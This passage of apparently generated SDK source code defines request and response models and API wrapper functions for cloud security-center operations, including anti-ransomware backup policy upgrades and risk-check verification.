async function updateJenkinsImageRegistryPersistenceDayWithOptions(request: UpdateJenkinsImageRegistryPersistenceDayRequest, runtime: Util.RuntimeOptions): UpdateJenkinsImageRegistryPersistenceDayResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.registryId)) {
    body['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'UpdateJenkinsImageRegistryPersistenceDay',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function updateJenkinsImageRegistryPersistenceDay(request: UpdateJenkinsImageRegistryPersistenceDayRequest): UpdateJenkinsImageRegistryPersistenceDayResponse {
  var runtime = new Util.RuntimeOptions{};
  return updateJenkinsImageRegistryPersistenceDayWithOptions(request, runtime);
}

model UpgradeBackupPolicyVersionRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.

> You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
}

model UpgradeBackupPolicyVersionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F5B8057-3E44-54DC-AC89-6814A4CD****'),
}

model UpgradeBackupPolicyVersionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: UpgradeBackupPolicyVersionResponseBody(name='body'),
}

async function upgradeBackupPolicyVersionWithOptions(request: UpgradeBackupPolicyVersionRequest, runtime: Util.RuntimeOptions): UpgradeBackupPolicyVersionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeBackupPolicyVersion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function upgradeBackupPolicyVersion(request: UpgradeBackupPolicyVersionRequest): UpgradeBackupPolicyVersionResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeBackupPolicyVersionWithOptions(request, runtime);
}

model ValidateHcWarningsRequest {
  checkIds?: string(name='CheckIds'),
  riskIds?: string(name='RiskIds', description='The UUIDs of servers on which you want to verify risk items.', example='43'),
  uuids?: string(name='Uuids', description='The ID of the request.', example='78645c8e-2e89-441b-8eb,a9622a6b-adb5-4dd3-929e,0136460a-1cb5-44e8-****'),
}

model ValidateHcWarningsResponseBody = {
  requestId?: string(name='RequestId', example='722C4F88-7867-4E7B-8ADE-7451053'),
}

model ValidateHcWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ValidateHcWarningsResponseBody(name='body'),
}

async function validateHcWarningsWithOptions(request: ValidateHcWarningsRequest, runtime: Util.RuntimeOptions): ValidateHcWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ValidateHcWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function validateHcWarnings(request: ValidateHcWarningsRequest): ValidateHcWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return validateHcWarningsWithOptions(request, runtime);
}

model VerifyCheckInstanceResultRequest {
  checkId?: long(name='CheckId', example='16'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model VerifyCheckInstanceResultResponseBody = {
  data?: {
    failInstances?: [ string ](name='FailInstances'),
    operateCode?: string(name='OperateCode', example='ActionTrialUnauthorized'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='B869E3A0-1147-539D-9920-47580700****'),
}

model VerifyCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckInstanceResultResponseBody(name='body'),
}

async function verifyCheckInstanceResultWithOptions(request: VerifyCheckInstanceResultRequest, runtime: Util.RuntimeOptions): VerifyCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckInstanceResult(request: VerifyCheckInstanceResultRequest): VerifyCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckInstanceResultWithOptions(request, runtime);
}

model VerifyCheckResultRequest {
  checkIds?: [ long ](name='CheckIds', description='An array that consists of the IDs of risk items.'),
}

model VerifyCheckResultResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode', description='The operation code of the cloud service configuration task. Valid values:

*   **Throttling**: frequency limit
*   **ActionTrialUnauthorized**: an error that is related to unauthorized operations', example='Throttling'),
  }(name='Data', description='The returned data.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C0A3FA0-AA32-5660-8989-85A5582F****'),
}

model VerifyCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckResultResponseBody(name='body'),
}

async function verifyCheckResultWithOptions(request: VerifyCheckResultRequest, runtime: Util.RuntimeOptions): VerifyCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckResult(request: VerifyCheckResultRequest): VerifyCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckResultWithOptions(request, runtime);
}

